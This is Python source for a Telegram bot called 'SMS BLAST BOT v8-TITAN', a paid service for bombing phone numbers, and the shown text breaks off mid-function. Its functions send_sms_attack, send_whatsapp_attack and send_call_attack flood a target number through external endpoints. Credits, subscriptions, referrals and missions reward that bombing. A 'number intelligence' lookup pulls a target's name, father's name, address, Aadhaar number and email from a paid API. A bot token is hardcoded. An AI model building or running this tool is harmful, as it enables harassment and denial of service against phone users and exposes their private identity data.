# =====================================================================
# SMS BLAST BOT v8-TITAN
# Full Features: Credits + Validity + Number Intelligence + Parallel SMS
# =====================================================================

import asyncio, json, os, time, logging, random, string, re
from datetime import datetime, timedelta
from copy import deepcopy
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

# ===== AUTO INSTALL DEPENDENCIES =====
import subprocess, sys

def install_packages():
    packages = ['aiogram', 'aiohttp', 'requests']
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_packages()

import aiohttp
import requests
import urllib3
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== EMOJI IDS (SAFE) ==========
EMOJI_FIRE = "5372849966689566579"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)


def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id and str(emoji_id).strip():
        try:
            return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
        except:
            return fallback
    return fallback


def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
    if emoji_id and str(emoji_id).strip():
        try:
            return InlineKeyboardButton(text=label, callback_data=callback_data, icon_custom_emoji_id=str(emoji_id).strip())
        except:
            pass
    return InlineKeyboardButton(text=label, callback_data=callback_data)


def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
    if emoji_id and str(emoji_id).strip():
        try:
            return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=str(emoji_id).strip())
        except:
            pass
    return InlineKeyboardButton(text=label, url=url)


# ================= CONFIG =================
MAIN_OWNER = 6906353235
SUPER_ADMIN_NAME = "@WTF_UCHIHA"
SUPER_ADMIN_LINK = "https://t.me/WTF_UCHIHA"
SUPER_ADMINS = [6906353235]

BOT_TOKEN = "8893329838:AAGflTYUSsZYwWAEiqRAUFHTS4SgIHVzmIo"
LOG_CHANNEL_ID = -1004302302341

_DATA_FILE = "blast5_data.json"
_BACKUP_INTERVAL = 6 * 3600
_VERSION = "v8-TITAN"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0
_VALIDITY_CHECK_INTERVAL = 6 * 3600
_RENEWAL_REMINDER_INTERVAL = 3600
_CONTEST_CHECK_INTERVAL = 6 * 3600
_TOURNAMENT_CHECK_INTERVAL = 3600

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

# ================= NUMBER INTELLIGENCE =================
NUM_INFO_API = "https://num-info-redzone.susxbunny.workers.dev/api?key=paid_key@REDZONE21&number={}"
NUM_INFO_TIMEOUT = 8
NUM_INFO_AUTO_DELETE_SECONDS = 120

# ================= IST =================
IST_OFFSET = timedelta(hours=5, minutes=30)

def ist_now() -> datetime:
    return datetime.utcnow() + IST_OFFSET

def ist_str(fmt: str = "%d/%m/%Y %H:%M:%S") -> str:
    return ist_now().strftime(fmt)

def ist_time_str() -> str:
    return ist_now().strftime("%H:%M:%S")

def ist_from_timestamp(ts: int, fmt: str = "%d/%m/%Y %H:%M") -> str:
    return (datetime.utcfromtimestamp(ts) + IST_OFFSET).strftime(fmt)

def ist_today_str() -> str:
    return ist_now().strftime("%Y-%m-%d")

def ist_week_str() -> str:
    return ist_now().strftime("%Y-W%W")

def ist_month_str() -> str:
    return ist_now().strftime("%Y-%m")

def ist_timestamp() -> str:
    return ist_now().strftime("%Y%m%d_%H%M%S")


# ================= BOMBING APIS =================
SMS_API = "https://thakurbhai-ajsjndnxkakendiwhdkzn.hb3284008.workers.dev/?phone={}"
WHATSAPP_API = "https://thakurbhai-ajsjndnxkakendiwhdkzn.hb3284008.workers.dev/?phone={}"

CALLING_APIS = [
   "https://bombom.hb3284008.workers.dev/?mobile={}",
   "https://bombom.hb3284008.workers.dev/?mobile={}",
   "https://bombom.hb3284008.workers.dev/?mobile={}",
   "https://bombom.hb3284008.workers.dev/?mobile={}",
   "https://bombom.hb3284008.workers.dev/?mobile={}",
   "http://thakur-privatebebdbbdbe.teyegegyrg.workers.dev/?phone={}",
   "http://thakur-privatebebdbbdbe.teyegegyrg.workers.dev/?phone={}",
   "http://thakur-privatebebdbbdbe.teyegegyrg.workers.dev/?phone={}",
   "http://thakur-privatebebdbbdbe.teyegegyrg.workers.dev/?phone={}",
   "http://thakur-privatebebdbbdbe.teyegegyrg.workers.dev/?phone={}",
   "http://thaku-callingapi.teyegegyrg.workers.dev/?phone={}",
   "http://thaku-callingapi.teyegegyrg.workers.dev/?phone={}",
   "http://thaku-callingapi.teyegegyrg.workers.dev/?phone={}",
   "http://thaku-callingapi.teyegegyrg.workers.dev/?phone={}",
   "http://thaku-callingapi.teyegegyrg.workers.dev/?phone={}",
]

BOMB_DURATION_MINUTES = 10
SMS_INTERVAL_SECONDS = 300
CALL_INTERVAL_SECONDS = 10
CREDITS_PER_CYCLE = 5

# ================= VALIDITY PLANS =================
DEFAULT_VALIDITY_PLANS = {
    "1":  {"days": 1,  "name": "1 DAY BASIC",     "emoji": "🎫", "price": 30},
    "7":  {"days": 7,  "name": "7 DAY STANDARD",  "emoji": "🎟️", "price": 150},
    "15": {"days": 15, "name": "15 DAY PREMIUM",  "emoji": "💎", "price": 300},
    "30": {"days": 30, "name": "30 DAY VIP",      "emoji": "👑", "price": 500},
    "90": {"days": 90, "name": "90 DAY LEGEND",   "emoji": "🔥", "price": 1200},
}

REFERRAL_MILESTONES = {5: 25, 10: 100, 25: 300, 50: 700, 100: 2000}
SPIN_PRIZES = [(1, 40), (2, 25), (3, 15), (4, 10), (5, 7), (10, 3)]

ACHIEVEMENTS = {
    "first_blood":    {"name": "First Blood",      "icon": "🩸", "condition": "1 SMS bheja"},
    "sms_100":        {"name": "100 SMS Club",     "icon": "🥉", "condition": "100 SMS bheje"},
    "sms_500":        {"name": "500 SMS Master",   "icon": "🥈", "condition": "500 SMS bheje"},
    "sms_1000":       {"name": "1000 SMS Legend",  "icon": "🥇", "condition": "1000 SMS bheje"},
    "bomb_expert":    {"name": "Bomb Expert",      "icon": "💥", "condition": "50 classic bombs"},
    "referral_king":  {"name": "Referral King",    "icon": "👑", "condition": "10+ referrals"},
    "loyal_user":     {"name": "Loyal User",       "icon": "💎", "condition": "30+ days active"},
    "spin_master":    {"name": "Spin Master",      "icon": "🎡", "condition": "30 spins"},
    "big_spender":    {"name": "Big Spender",      "icon": "💰", "condition": "500+ credits khareede"},
    "early_bird":     {"name": "Early Bird",       "icon": "🌅", "condition": "Pehle 100 users"},
}

DAILY_MISSIONS = {
    "sms_10":        {"name": "10 SMS bhejo",        "target": 10,  "reward": 5,  "icon": "📤"},
    "referral_1":    {"name": "1 referral karo",     "target": 1,   "reward": 10, "icon": "👥"},
    "bomb_3":        {"name": "3 classic bombs",     "target": 3,   "reward": 15, "icon": "💥"},
    "spin_1":        {"name": "Spin wheel use karo", "target": 1,   "reward": 2,  "icon": "🎡"},
    "template_1":    {"name": "1 template use karo", "target": 1,   "reward": 3,  "icon": "📝"},
    "credits_spend": {"name": "20 credits use karo", "target": 20,  "reward": 5,  "icon": "💰"},
}

WEEKLY_MISSIONS = {
    "sms_100":       {"name": "100 SMS bhejo",       "target": 100, "reward": 50,  "icon": "📤"},
    "referral_5":    {"name": "5 referrals karo",    "target": 5,   "reward": 100, "icon": "👥"},
    "bomb_10":       {"name": "10 classic bombs",    "target": 10,  "reward": 75,  "icon": "💥"},
    "login_7":       {"name": "7 din consecutive",   "target": 7,   "reward": 30,  "icon": "🔥"},
}

LANG_STRINGS = {
    "en": {"welcome": "Welcome!", "credits": "Credits", "validity": "Validity"},
    "hi": {"welcome": "स्वागत है!", "credits": "क्रेडिट्स", "validity": "वैलिडिटी"},
    "hinglish": {"welcome": "Swagat hai!", "credits": "Credits", "validity": "Validity"},
}

def L(uid: int, key: str, d: dict = None) -> str:
    if d is None: d = load()
    lang = d.get("users", {}).get(str(uid), {}).get("language", "hinglish")
    return LANG_STRINGS.get(lang, LANG_STRINGS["hinglish"]).get(key, key)


# ================= BOMBING FUNCTIONS =================
def send_sms_attack(phone: str) -> Tuple[bool, str]:
    try:
        requests.get(SMS_API.format(phone), headers={'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
        return True, "✅"
    except Exception as e:
        log.error(f"SMS: {e}")
        return False, "❌"

def send_whatsapp_attack(phone: str) -> Tuple[bool, str]:
    try:
        requests.get(WHATSAPP_API.format(phone), headers={'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
        return True, "✅"
    except Exception as e:
        log.error(f"WA: {e}")
        return False, "❌"

def send_call_attack(phone: str, api_index: int) -> Tuple[bool, str]:
    try:
        api_url = CALLING_APIS[api_index % len(CALLING_APIS)]
        requests.get(api_url.format(phone), headers={'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
        return True, "✅"
    except Exception as e:
        log.error(f"Call: {e}")
        return False, "❌"


# ================= STORAGE =================
active_classic_bombings = {}
classic_bombing_stats = {}
scheduled_bombs = {}
recurring_schedules = {}
USER_LAST_BLAST = {}
RATE_LIMIT_SECONDS = 60
BOMB_QUEUE = defaultdict(list)
USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}
TOURNAMENTS = {}

# ================= STATES =================
class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_plan_discount = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    classic_bomb_number = State()
    classic_bomb_credits = State()
    multi_target_numbers = State()
    multi_target_count = State()
    multi_target_type = State()
    schedule_bomb_type = State()
    schedule_bomb_number = State()
    schedule_bomb_time = State()
    schedule_bomb_cycles = State()
    schedule_custom_number = State()
    schedule_custom_time = State()
    schedule_custom_message = State()
    schedule_custom_speed = State()
    schedule_custom_count = State()
    user_schedule_bomb_type = State()
    user_schedule_bomb_number = State()
    user_schedule_bomb_time = State()
    user_schedule_bomb_cycles = State()
    user_schedule_custom_number = State()
    user_schedule_custom_time = State()
    user_schedule_custom_message = State()
    user_schedule_custom_speed = State()
    user_schedule_custom_count = State()
    recurring_bomb_type = State()
    recurring_phone = State()
    recurring_time = State()
    recurring_cycles = State()
    recurring_custom_number = State()
    recurring_custom_time = State()
    recurring_custom_message = State()
    recurring_custom_speed = State()
    recurring_custom_count = State()
    validity_uid = State()
    validity_plan = State()
    nickname_input = State()
    save_list_name = State()
    save_list_numbers = State()
    quick_bomb_list_id = State()
    quick_bomb_cycles = State()
    quick_bomb_type = State()
    tutorial_step = State()
    add_sub_plan_name = State()
    add_sub_plan_days = State()
    add_sub_plan_price = State()
    add_sub_plan_link = State()
    template_save_name = State()
    template_save_text = State()
    template_edit_text = State()
    maintenance_message = State()
    maintenance_eta = State()
    contest_prizes_set = State()
    lucky_draw_credits = State()
    notif_pref_toggle = State()


# ================= DATA =================
def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER], "admins": [], "banned": [], "free_mode": False,
        "approved": [], "firebases": [], "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []}, "subscription": {"plans": []},
        "redeem_codes": {}, "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {}, "activity_log": [], "protected_numbers": {},
        "videos": [], "saved_lists": {}, "scheduled_bombs": {},
        "pending_payments": {}, "validity_notified": {}, "daily_bonus": {},
        "maintenance": {"enabled": False, "message": "Bot is under maintenance.", "eta": "", "auto_resume_at": 0},
        "referral_contest": {"enabled": False, "prizes": [100, 50, 25], "last_distributed": "", "history": []},
        "template_limit": 10,
        "renewal_reminders": {},
        "recurring": {},
        "lucky_draw": {"enabled": False, "credits": 50, "last_drawn": ""},
        "milestones_claimed": {},
        "spin_history": {},
        "tournaments": {"enabled": False, "prizes": [500, 250, 100], "history": []},
        "user_achievements": {},
        "user_missions": {},
        "user_stats": {},
        "firebase_health": {},
    }


def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data: data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u: u["credits"] = 0
                if "sms_history" not in u: u["sms_history"] = []
                if "validity_until" not in u: u["validity_until"] = 0
                if "validity_plan" not in u: u["validity_plan"] = None
                if "validity_start" not in u: u["validity_start"] = 0
                if "language" not in u: u["language"] = "hinglish"
                if "nickname" not in u: u["nickname"] = None
                if "tutorial_done" not in u: u["tutorial_done"] = False
                if "refer_count" not in u: u["refer_count"] = 0
                if "saved_lists" not in u: u["saved_lists"] = []
                if "templates" not in u: u["templates"] = []
                if "notif_prefs" not in u:
                    u["notif_prefs"] = {"credits_low": True, "validity_expiring": True,
                                        "new_feature": True, "broadcast": True, "marketing": False}
                if "last_spin" not in u: u["last_spin"] = 0
                if "credits_bought" not in u: u["credits_bought"] = 0
            return data
        except Exception as e:
            log.error(f"Load: {e}")
    d = _default_data()
    save(d)
    return d


def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)


def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 5,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": [], "validity_until": 0, "validity_plan": None,
            "validity_start": 0, "language": "hinglish", "nickname": None,
            "tutorial_done": False, "refer_count": 0, "saved_lists": [],
            "templates": [],
            "notif_prefs": {"credits_low": True, "validity_expiring": True,
                            "new_feature": True, "broadcast": True, "marketing": False},
            "last_spin": 0, "credits_bought": 0,
        }
        return True
    return False


def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]


# ================= PERMISSIONS =================
def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d): return False
    if is_admin(uid, d): return True
    if d.get("free_mode"): return True
    if uid in d.get("approved", []): return True
    return False


# ================= VALIDITY =================
def get_validity_info(uid: int, d: dict) -> dict:
    u = d.get("users", {}).get(str(uid), {})
    until = u.get("validity_until", 0)
    plan = u.get("validity_plan")
    now = int(time.time())
    if until <= 0 or not plan:
        return {"until": 0, "plan_name": None, "days_left": 0, "hours_left": 0,
                "is_expired": False, "has_validity": False}
    days_left = max(0, (until - now) // 86400)
    hours_left = max(0, (until - now) // 3600)
    return {"until": until, "plan_name": plan, "days_left": days_left,
            "hours_left": hours_left, "is_expired": until <= now, "has_validity": True}


def get_validity_percent(uid: int, d: dict) -> int:
    u = d.get("users", {}).get(str(uid), {})
    until = u.get("validity_until", 0)
    start = u.get("validity_start", 0)
    if until <= 0 or start <= 0: return 0
    now = int(time.time())
    total = until - start
    if total <= 0: return 0
    return max(0, min(100, int(((now - start) / total) * 100)))


def set_validity(uid: int, days: int, plan_name: str, d: dict) -> int:
    k = str(uid)
    if k not in d["users"]: return 0
    now = int(time.time())
    current_until = d["users"][k].get("validity_until", 0)
    base = current_until if current_until > now else now
    new_until = base + (days * 86400)
    d["users"][k]["validity_until"] = new_until
    d["users"][k]["validity_plan"] = plan_name
    d["users"][k]["validity_start"] = now
    return new_until


def remove_validity(uid: int, d: dict):
    k = str(uid)
    if k in d["users"]:
        d["users"][k]["validity_until"] = 0
        d["users"][k]["validity_plan"] = None
        d["users"][k]["validity_start"] = 0


def has_active_validity(uid: int, d: dict) -> bool:
    v = get_validity_info(uid, d)
    return v["has_validity"] and not v["is_expired"]


def should_deduct_credits(uid: int, d: dict) -> bool:
    if is_admin(uid, d) or is_owner(uid, d): return False
    if has_active_validity(uid, d): return False
    return True


def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    v = get_validity_info(uid, d)
    if v["has_validity"]:
        if v["is_expired"]: return f"{em(EMOJI_CROSS, '⏰')} ᴇxᴘɪʀᴇᴅ ({v['plan_name']})"
        if v["days_left"] >= 1: return f"{em(EMOJI_CHECK, '✅')} {v['plan_name']} • {v['days_left']}ᴅ ʟᴇғᴛ"
        else: return f"{em(EMOJI_WARNING, '⏳')} {v['plan_name']} • {v['hours_left']}ʜ ʟᴇғᴛ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"


def get_display_name(uid: int, d: dict) -> str:
    u = d.get("users", {}).get(str(uid), {})
    return u.get("nickname") or u.get("name", "Unknown")


def check_rate_limit(uid: int, d: dict) -> tuple:
    if is_admin(uid, d) or is_owner(uid, d): return True, 0
    last = USER_LAST_BLAST.get(uid, 0)
    elapsed = time.time() - last
    if elapsed < RATE_LIMIT_SECONDS:
        return False, int(RATE_LIMIT_SECONDS - elapsed)
    return True, 0


def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)


def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}): d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount


def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False


def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists: break
    if k in d.get("users", {}): d["users"][k]["refer_code"] = code
    return code


def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str); break
    if not referrer_uid: return False, f"❌ ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid: return False, f"❌ ᴀᴘɴᴀ ᴄᴏᴅᴇ ɴᴀʜɪɴ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"): return False, f"❌ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    old_count = d["users"][str(referrer_uid)].get("refer_count", 0)
    new_count = old_count + 1
    d["users"][str(referrer_uid)]["refer_count"] = new_count
    for m, bonus in REFERRAL_MILESTONES.items():
        if new_count == m:
            add_credits(referrer_uid, bonus, d); break
    save(d)
    return True, f"🎉 ᴡᴇʟᴄᴏᴍᴇ! +{ref_credits} ᴄʀᴇᴅɪᴛs!", referrer_uid


# ================= NUMBER INTELLIGENCE (UNIVERSAL PARSER) =================
def extract_indian_number(raw: str) -> Optional[str]:
    """Extract 10-digit Indian mobile from ANY format."""
    if not raw:
        return None
    digits = re.sub(r'\D', '', str(raw))
    if not digits:
        return None
    if len(digits) == 12 and digits.startswith("91"):
        digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0"):
        digits = digits[1:]
    elif len(digits) == 13 and digits.startswith("091"):
        digits = digits[3:]
    elif len(digits) == 10:
        pass
    elif len(digits) > 12:
        match = re.search(r'91(\d{10})', digits)
        if match:
            digits = match.group(1)
        else:
            digits = digits[-10:]
    if len(digits) == 10 and re.match(r'^[6-9]\d{9}$', digits):
        return digits
    return None


async def fetch_number_info(phone: str) -> dict:
    """Fetch number info from API."""
    clean_phone = extract_indian_number(phone)
    if not clean_phone:
        return {}
    phone = clean_phone
    url = NUM_INFO_API.format(phone)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(total=NUM_INFO_TIMEOUT)
            ) as r:
                if r.status != 200:
                    log.warning(f"[NUM-INFO] HTTP {r.status}")
                    return {}
                txt = (await r.text()).strip()
                if not txt:
                    return {}
                try:
                    data = json.loads(txt)
                    return data if isinstance(data, dict) else {}
                except json.JSONDecodeError:
                    return {}
    except asyncio.TimeoutError:
        return {}
    except Exception as e:
        log.error(f"[NUM-INFO] {e}")
        return {}


def format_number_info(phone: str, info: dict) -> str:
    """
    Format number info from REDZONE API.
    """
    result = info.get("result", {}) if isinstance(info, dict) else {}
    if not result:
        result = info

    def get_val(*keys, default="N/A"):
        for k in keys:
            v = result.get(k)
            if v is not None and str(v).strip() and str(v).lower() not in ("null", "none", "undefined"):
                return str(v).strip()
        return default

    masked = mask_number(phone)

    number_val = get_val("📱 Phone Number", "Phone Number", "phone", "number", default=phone)
    name = get_val("👤 Name", "Name", "name", "owner_name", "full_name")
    father_name = get_val("👨‍👦 Father's Name", "Father's Name", "father_name", "father")
    address = get_val("🏠 Address", "Address", "address", "addr", "full_address")
    alt = get_val("📞 Alternate Number", "Alternate Number", "alternate", "alt_number", "alt")
    circle = get_val("📡 Circle", "Circle", "circle", "state", "region", "location")
    aadhaar = get_val("🪪 Aadhaar Number", "Aadhaar Number", "aadhaar", "aadhaar_number")
    email = get_val("📧 Email", "Email", "email")

    lines = [
        f"📞 <b>NUMBER INTELLIGENCE</b>",
        f"━━━━━━━━━━━━━━━━━━",
        f"",
        f"🔢 <b>Number:</b> <code>{masked}</code>",
        f"📡 <b>Circle:</b> {circle}",
    ]

    if name and name != "N/A":
        lines.append(f"👤 <b>Name:</b> {name}")
    if father_name and father_name != "N/A":
        lines.append(f"👨‍👦 <b>Father's Name:</b> {father_name}")
    if address and address != "N/A":
        clean_addr = " ".join(address.split())
        if len(clean_addr) > 120:
            clean_addr = clean_addr[:120] + "..."
        lines.append(f"🏠 <b>Address:</b> {clean_addr}")
    if aadhaar and aadhaar != "N/A":
        lines.append(f"🪪 <b>Aadhaar:</b> <code>{aadhaar}</code>")
    if alt and alt != "N/A":
        lines.append(f"📞 <b>Alt Number:</b> <code>{alt}</code>")
    if email and email != "N/A":
        lines.append(f"📧 <b>Email:</b> {email}")

    lines.append(f"")
    lines.append(f"━━━━━━━━━━━━━━━━━━")
    lines.append(f"<i>⚠️ Ye info {NUM_INFO_AUTO_DELETE_SECONDS // 60} minute me auto-delete hogi</i>")

    return "\n".join(lines)


def num_info_kb(phone: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✅ ᴀɢʀᴇᴇ & ᴄᴏɴᴛɪɴᴜᴇ", f"numinfo:agree:{phone}", EMOJI_CHECK, "✅")],
        [btn("❌ ᴄᴀɴᴄᴇʟ", f"numinfo:cancel:{phone}", EMOJI_CROSS, "❌")],
    ])


def classic_num_info_kb(phone: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✅ ᴀɢʀᴇᴇ & ᴄᴏɴᴛɪɴᴜᴇ", f"classicnuminfo:agree:{phone}", EMOJI_CHECK, "✅")],
        [btn("❌ ᴄᴀɴᴄᴇʟ", f"classicnuminfo:cancel:{phone}", EMOJI_CROSS, "❌")],
    ])


async def auto_delete_num_info(bot: Bot, chat_id: int, message_id: int, delay: int):
    try:
        await asyncio.sleep(delay)
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass


# ================= KEYBOARD HELPERS =================
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])


def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
         btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
         btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]
    ])


def mask_number(number: str) -> str:
    if len(number) <= 4: return number
    return number[:2] + "******" + number[-4:]


def fmt_time(ts: int) -> str:
    return ist_from_timestamp(ts, "%d/%m/%Y %H:%M")


def fmt_duration(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"


def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0: return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)


def validity_progress_bar(percent: int, width: int = 15) -> str:
    filled = min(width, int(width * percent / 100))
    return "█" * filled + "░" * (width - filled)


def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])


def renewal_reminder_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("💎 ʀᴇɴᴇᴡ ɴᴏᴡ", "user:subscription", EMOJI_MONEY, "💎")],
        [btn("🏠 ʜᴏᴍᴇ", "user:home", EMOJI_GEAR, "🏠")],
    ])


def progress_text(sent: int, failed: int, total: int, credits=None, speed_label="⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
